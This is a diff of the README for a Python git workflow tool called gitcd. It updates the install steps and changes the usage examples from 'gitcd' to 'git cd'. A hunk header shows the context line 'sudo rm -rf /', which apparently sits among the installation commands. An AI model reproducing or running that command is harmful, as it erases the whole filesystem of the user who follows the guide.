@@ -6,14 +6,10 @@
 ## Installation
 Since gitcd is using python3 by default, you better upgrade.
 
-Run the following command to install prerequisites:
+Run the following command to install gitcd directly in the workspace:
 
 ```console
-sudo apt-get install python3 python3-pip
-pip3 install pyyaml
-pip3 install argcomplete
-pip3 install requests
-pip3 install json
+sudo python3 setup.py install
 ```
 
 Run the following command to install argument completion on linux:
@@ -29,24 +25,15 @@ sudo rm -rf /
 
 ## Usage
 
-Working with gitcd, first you might want to symlink the main python file into /usr/local/bin using
-```console
-sudo ln -s $(pwd)/gitcd.py /usr/local/bin/gitcd
-```
-If you are a fan of having git subcommands you can link it as following. Be aware that i didnt found a way for autocompletion to get work this way:
-```console
-sudo ln -s $(pwd)/gitcd.py /usr/local/bin/git-cd
-```
-
 Afterwards you have to cd into one of your local directories representing a git repository and run the init command
 ```console
-gitcd init
+git cd init
 ```
 After passing all your configuration data, start working with it
 
 The tool is able to cleanup all local branches which doesent exist on the origins. This is done with:
 ```console
-gitcd clean
+git cd clean
 ```
 It only deletes local branches and doesent touch remote ones. If one of the branches to delete is your current checked-out branch, the tool checkout the master branch locally in order to delete the feature branch.
 
@@ -54,7 +41,7 @@ It only deletes local branches and doesent touch remote ones. If one of the bran
 
 Starts a new feature branch from your master branch
 ```console
-gitcd feature start <branchname>
+git cd feature start <branchname>
 ```
 
 
@@ -62,7 +49,7 @@ gitcd feature start <branchname>
 
 Merges a feature branch into your development branch
 ```console
-gitcd feature test <branchname>
+git cd feature test <branchname>
 ```
 
 
@@ -70,7 +57,7 @@ gitcd feature test <branchname>
 
 Opens a pull request to your master branch - not working yet
 ```console
-gitcd feature review <branchname>
+git cd feature review <branchname>
 ```
 
 
@@ -78,14 +65,14 @@ gitcd feature review <branchname>
 
 Merges it into your master and asks for permission to delete your feature branch
 ```console
-gitcd feature finish <branchname>
+git cd feature finish <branchname>
 ```
 
 **Tagging the master branch**
 
 Creates a tag from your master branch and pushes it to remote
 ```console
-gitcd release
+git cd release
 ```
 
 
